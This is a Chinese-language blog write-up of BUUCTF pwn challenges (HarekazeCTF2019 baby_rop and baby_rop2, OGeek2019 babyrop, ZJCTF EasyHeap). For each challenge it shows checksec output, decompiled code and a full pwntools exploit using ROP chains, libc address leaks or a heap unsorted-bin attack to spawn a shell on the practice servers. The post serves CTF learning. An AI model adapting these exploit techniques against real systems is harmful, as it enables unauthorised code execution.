<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Joe1sn's Cabinet | BUUCTF Pwn WriteUp</title><meta name="description" content="&lt;p&gt;buu部分刷题记录&lt;/p&gt;"><link rel="icon" href="/images/favicon.png"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700"><link rel="stylesheet" href="/css/highlights/darkula.css"><link rel="stylesheet" href="/css/main.css"><link rel="search" type="application/opensearchdescription+xml" href="https://joe1sn.eu.org/atom.xml" title="Joe1sn's Cabinet"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Joe1sn's Cabinet" type="application/atom+xml">
</head><body><div class="container"><header class="main-header"><h1 class="main-header__title uplize"><a class="main-header__title__link" href="/">Joe1sn's Cabinet</a></h1><nav class="main-header__nav"><ul class="main-nav"><li class="main-nav__list"><a class="main-nav__list__link" href="/" target="_self">HOME</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="/archives/" target="_self">ARCHIVE</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="https://github.com/Joe1sn" target="_blank">GITHUB</a></li></ul></nav></header><main class="container__wrapper"><article class="article post"><h3 class="article__title">BUUCTF Pwn WriteUp</h3><div class="article__date metadata"><div class="post-info">2021/03/14</div></div><div class="article__tags metadata">Tags:
<a class="article__tags__link metadata" href="/tags/writeup/">writeup</a><a class="article__tags__link metadata" href="/tags/pwn/">pwn</a><a class="article__tags__link metadata" href="/tags/BUUCTF/">BUUCTF</a></div><div class="article__body"><p>buu部分刷题记录</p>
<span id="more"></span>
<h2 id="harekazectf2019baby_rop"><a class="markdownIt-Anchor" href="#harekazectf2019baby_rop"></a> [HarekazeCTF2019]baby_rop</h2>
<h3 id="1checksec"><a class="markdownIt-Anchor" href="#1checksec"></a> 1.checksec()</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<h3 id="2ida"><a class="markdownIt-Anchor" href="#2ida"></a> 2.IDA</h3>
<p>main</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;echo -n \&quot;What&#x27;s your name? \&quot;&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Welcome to the Pwn World, %s!\n&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>scanf的溢出，注意，要溢出的栈+8</p>
</blockquote>
<h3 id="3exp"><a class="markdownIt-Anchor" href="#3exp"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29829</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x0601048</span></span><br><span class="line">sys_addr = <span class="number">0x00400490</span></span><br><span class="line">pop_rdi = <span class="number">0x0400683</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">24</span> + p64(pop_rdi) + p64(binsh_addr) + p64(sys_addr) + p64(<span class="number">0</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;?&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>flag在home文件夹下的文件夹中</p>
<h2 id="harekazectf2019baby_rop2"><a class="markdownIt-Anchor" href="#harekazectf2019baby_rop2"></a> [HarekazeCTF2019]baby_rop2</h2>
<p>环境：？</p>
<h3 id="1checksec-2"><a class="markdownIt-Anchor" href="#1checksec-2"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<h3 id="2ida-2"><a class="markdownIt-Anchor" href="#2ida-2"></a> 2.IDA</h3>
<p><strong>main</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">28</span>]; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What&#x27;s your name? &quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">  v3 = read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  v6 = v3;</span><br><span class="line">  buf[v3 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Welcome to the Pwn World again, %s!\n&quot;</span>, buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>printf输出read的真实地址，再ROP</p>
</blockquote>
<h3 id="3exp-2"><a class="markdownIt-Anchor" href="#3exp-2"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./babyrop2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;babyrop2&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28113</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000400733</span></span><br><span class="line">pop_rsi_r15_ret=<span class="number">0x0000000000400731</span></span><br><span class="line">format_addr=<span class="number">0x0000000000400790</span> <span class="comment"># %s</span></span><br><span class="line"></span><br><span class="line">printf_plt=elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_plt=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x28</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(format_addr)</span><br><span class="line">payload += p64(pop_rsi_r15_ret) + p64(read_got) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(printf_plt) + p64(main_plt)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name? &quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;!\n&quot;</span>)</span><br><span class="line">read_real = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = read_real - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">sys_addr = libc.sym[<span class="string">&quot;system&quot;</span>] + libc_base</span><br><span class="line">binsh = libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>() + libc_base</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(binsh)</span><br><span class="line">payload += p64(sys_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name? &quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>flag 位置在 /home/babyrop2/</p>
</blockquote>
<h2 id="ogeek2019babyrop"><a class="markdownIt-Anchor" href="#ogeek2019babyrop"></a> [OGeek2019]babyrop</h2>
<h3 id="1checksec-3"><a class="markdownIt-Anchor" href="#1checksec-3"></a> 1.checksec()</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000) </span><br></pre></td></tr></table></figure>
<h3 id="2ida-3"><a class="markdownIt-Anchor" href="#2ida-3"></a> 2.IDA</h3>
<p>main</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> buf; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// [esp+Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  sub_80486BB();</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &gt; <span class="number">0</span> )</span><br><span class="line">    read(fd, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v2 = sub_804871F(buf);</span><br><span class="line">  sub_80487D0(v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>sub_804871F</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_804871F</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [esp+Ch] [ebp-4Ch]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">7</span>]; <span class="comment">// [esp+2Ch] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v5; <span class="comment">// [esp+33h] [ebp-25h]</span></span><br><span class="line">  <span class="type">ssize_t</span> v6; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">sprintf</span>(&amp;s, <span class="string">&quot;%ld&quot;</span>, a1);</span><br><span class="line">  v6 = read(<span class="number">0</span>, buf, <span class="number">0x20</span>u);</span><br><span class="line">  buf[v6 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(buf, &amp;s, v1) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Correct\n&quot;</span>, <span class="number">8u</span>);</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>sub_80487D0</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __cdecl <span class="title function_">sub_80487D0</span><span class="params">(<span class="type">char</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [esp+11h] [ebp-E7h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">127</span> )</span><br><span class="line">    result = read(<span class="number">0</span>, &amp;buf, <span class="number">0xC8</span>u);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = read(<span class="number">0</span>, &amp;buf, a1);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>sprintf：sprintf 返回以format为格式argument为内容组成的结果被写入string的字节数，结束字符‘\0’不计入内。即，如果“Hello”被写入空间足够大的string后，函数sprintf 返回5</p>
</blockquote>
<p>也就是说第一个是’\0’可以绕过检测<br />
string</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0804840B	00000006	C	write</span><br><span class="line">LOAD:08048411	0000000F	C	__gmon_start__</span><br><span class="line">LOAD:08048420	0000000A	C	GLIBC_2.0</span><br><span class="line">.rodata:08048920	0000000A	C	Time&#x27;s up</span><br><span class="line">.rodata:0804892E	00000009	C	Correct\n</span><br><span class="line">.rodata:08048937	0000000D	C	/dev/urandom</span><br><span class="line">.eh_frame:080489C7	00000005	C	;*2$\&quot;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>没有/bin/sh，没有system函数，有libc，考虑write泄露libc</p>
</blockquote>
<h3 id="3exp-3"><a class="markdownIt-Anchor" href="#3exp-3"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">28118</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">main_addr = <span class="number">0x08048825</span></span><br><span class="line"></span><br><span class="line">libc_write = libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">libc_system = libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"><span class="comment">#binsh = next(libc.search(&#x27;/bin/sh&#x27;))</span></span><br><span class="line">binsh = <span class="number">0x15902b</span></span><br><span class="line"></span><br><span class="line">payload_1 = <span class="string">&#x27;\x00&#x27;</span>+ <span class="string">&#x27;\xff&#x27;</span>*<span class="number">7</span></span><br><span class="line"></span><br><span class="line">paylaod_2 = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0xe7</span>+<span class="number">4</span>) + p32(write_plt) + p32(main_addr)</span><br><span class="line">paylaod_2 += p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload_1)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Correct\n&quot;</span>)</span><br><span class="line">p.sendline(paylaod_2)</span><br><span class="line"></span><br><span class="line">real_write = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = real_write - libc_write</span><br><span class="line">real_system = libc_base + libc_system</span><br><span class="line">binsh = binsh + libc_base</span><br><span class="line"></span><br><span class="line">payload_1 = <span class="string">&#x27;\x00&#x27;</span>+ <span class="string">&#x27;\xff&#x27;</span>*<span class="number">7</span></span><br><span class="line">payload_3 = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0xe7</span>+<span class="number">4</span>) + p32(real_system) + p32(<span class="number">0</span>)</span><br><span class="line">payload_3 += p32(binsh)</span><br><span class="line"></span><br><span class="line">p.sendline(payload_1)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Correct\n&quot;</span>)</span><br><span class="line">p.sendline(payload_3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>接受的4字节不需要在ljust对齐了</p>
</blockquote>
<h2 id="zjctf-2019easyheap"><a class="markdownIt-Anchor" href="#zjctf-2019easyheap"></a> [ZJCTF 2019]EasyHeap</h2>
<blockquote>
<p>和hitocn trainning magic heap 一样</p>
</blockquote>
<h3 id="1checksec-4"><a class="markdownIt-Anchor" href="#1checksec-4"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<h3 id="2ida-4"><a class="markdownIt-Anchor" href="#2ida-4"></a> 2.IDA</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">def add(sz,text):</span><br><span class="line">	p.sendlineafter(&quot;:&quot;,&quot;1&quot;)</span><br><span class="line">	p.sendlineafter(&quot;:&quot;,str(sz))</span><br><span class="line">	p.sendlineafter(&quot;:&quot;,text)</span><br><span class="line">def edit(idx,text):</span><br><span class="line">	p.sendlineafter(&quot;:&quot;,&quot;2&quot;)</span><br><span class="line">	p.sendlineafter(&quot;:&quot;,str(idx))</span><br><span class="line">	p.sendlineafter(&quot;:&quot;,str(len(text)))</span><br><span class="line">	p.sendlineafter(&quot;:&quot;,str(text))</span><br><span class="line">def free(idx):</span><br><span class="line">	p.sendlineafter(&quot;:&quot;,&quot;3&quot;)</span><br><span class="line">	p.sendlineafter(&quot;:&quot;,str(idx))</span><br></pre></td></tr></table></figure>
<p><strong>back_door</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int l33t()</span><br><span class="line">&#123;</span><br><span class="line">  return system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>edit_heap</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;Size of Heap : &quot;, (char *)&amp;v1 + 4, v1);</span><br><span class="line"> read(0, (char *)&amp;v1 + 4, 8uLL);</span><br><span class="line"> v2 = atoi((const char *)&amp;v1 + 4);</span><br><span class="line"> printf(&quot;Content of heap : &quot;, (char *)&amp;v1 + 4, v1);</span><br><span class="line"> read_input(heaparray[(signed int)v1], v2);</span><br><span class="line"> return puts(&quot;Done !&quot;);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>未控制边界，堆溢出</p>
</blockquote>
<h3 id="3exp-4"><a class="markdownIt-Anchor" href="#3exp-4"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./magicheap&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/joe1sn/libc/64/libc-2.23.so&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./magicheap&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node3.buuoj.cn&quot;,&quot;25535&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">sz,text</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(sz))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,text</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(text)))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(text))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">l33t = <span class="number">0x6020A0</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">	add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">	add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	free(<span class="number">2</span>)</span><br><span class="line">	edit(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(l33t-<span class="number">0x13</span>)) <span class="comment">#&lt;--控制bk指针</span></span><br><span class="line"></span><br><span class="line">	add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>) <span class="comment">#2</span></span><br><span class="line">	add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>) <span class="comment">#3 fake_chunk</span></span><br><span class="line">	edit(<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(<span class="number">0x1305</span>))</span><br><span class="line">	p.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>为什么是p64(l33t-0x13)？</p>
<blockquote>
<p>经过动态调试得知，该处是unsorted bin链表</p>
</blockquote>
<p>为什么edit(3,’a’*8)？</p>
<blockquote>
<p>覆写magic的值为‘0x6161616161616161’，从而进入后门</p>
</blockquote>
</blockquote>
<h2 id="zjctf-2019login"><a class="markdownIt-Anchor" href="#zjctf-2019login"></a> [ZJCTF 2019]Login</h2>
<h3 id="1checksec-5"><a class="markdownIt-Anchor" href="#1checksec-5"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
